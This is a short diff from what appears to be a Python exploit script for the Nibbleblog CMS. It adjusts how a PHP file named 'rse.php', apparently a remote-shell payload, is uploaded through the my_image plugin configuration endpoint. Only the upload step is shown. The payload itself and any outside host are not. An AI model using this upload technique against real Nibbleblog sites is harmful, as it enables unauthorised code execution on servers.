@@ -27,7 +27,7 @@ class Nibbleblog():
         }
 
         file_content = {
-            'rse':('rse.php',payload,{'Content-Type':'application/x-php'},{'Content-Disposition':'form-data'}),
+            'rse':('rse.php',payload,'application/x-php',{'Content-Disposition':'form-data'}),
         }
 
         url_upload = self.target + "?controller=plugins&action=config&plugin=my_image"
